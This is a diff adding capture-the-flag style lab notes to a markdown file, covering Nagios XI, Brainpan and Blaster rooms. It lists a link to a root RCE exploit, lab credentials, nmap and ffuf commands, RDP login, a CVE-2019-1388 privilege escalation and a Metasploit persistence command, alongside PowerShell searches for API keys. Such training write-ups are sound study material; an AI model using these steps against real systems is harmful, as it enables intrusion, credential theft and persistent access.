@@ -937,7 +937,7 @@ Display contents of a backup file:
 `Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue | type`
 
 Search for all files containing "API_KEY":
-`Get-ChildItem -Path C:\ -File -Include *.xml -Recurse -ErrorAction SilentlyContinue | Select-String "API_KEY"` or ``
+`Get-ChildItem -Path C:\ -File -Include *.xml -Recurse -ErrorAction SilentlyContinue | Select-String "API_KEY"`
 
 List all scheduled tasks:
 `Get-ScheduledTask`
@@ -981,3 +981,68 @@ for ($i=[int]$start; $i -le [int]$stop; $i++) {
     }
 }
 ```
+
+### Day 11 - The best it yet to come
+
+We reproduced CVE-2020-11561.
+
+### Day 12 - Whatever shell pops v2
+```
+47 80 73 51 84 46 80 78 103
+http://target/PI3T.PNg
+exiftool
+https://www.bertnase.de/npiet/npiet-execute.php
+nagiosadmin%n3p3UQ&9BjLp4$7uhWdY
+http://target/nagiosxi/login.php
+https://raw.githubusercontent.com/jakgibb/nagiosxi-root-rce-exploit/master/exploit.php
+```
+### Day 13 - Brainpan 1
+
+https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86
+
+### Day 14 - Blaster
+
+Initial nmap scan: `nmap -sC -sV -T5 --min-rate 2500 -p- -Pn target -oN nmap.log -v`
+```
+Nmap scan report for target (10.10.239.85)
+Host is up (0.042s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RETROWEB
+|   NetBIOS_Domain_Name: RETROWEB
+|   NetBIOS_Computer_Name: RETROWEB
+|   DNS_Domain_Name: RetroWeb
+|   DNS_Computer_Name: RetroWeb
+|   Product_Version: 10.0.14393
+|_  System_Time: 2020-05-12T17:43:08+00:00
+| ssl-cert: Subject: commonName=RetroWeb
+| Issuer: commonName=RetroWeb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-05-11T17:39:23
+| Not valid after:  2020-11-10T17:39:23
+| MD5:   4c42 c1e2 1ad1 cbc2 9971 6407 373f 9d4e
+|_SHA-1: 1c7f 1430 bd9a 9608 157d 1453 01c5 0ee5 63fe 58f2
+|_ssl-date: 2020-05-12T17:43:09+00:00; +1s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+Subdirectory bruteforcing:
+`ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://target/FUZZ`
+
+Browse through the website, discover the login issues and guess the password to the user you found.
+
+Login to WP-Dashboard and RDP:
+`xfreerdp /u:Wade /p:parzival /v:target`
+
+Use the researched [CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388) to get Administrator priviledges.
+Finally, get persistence with Metasploit: `run persistence -X`
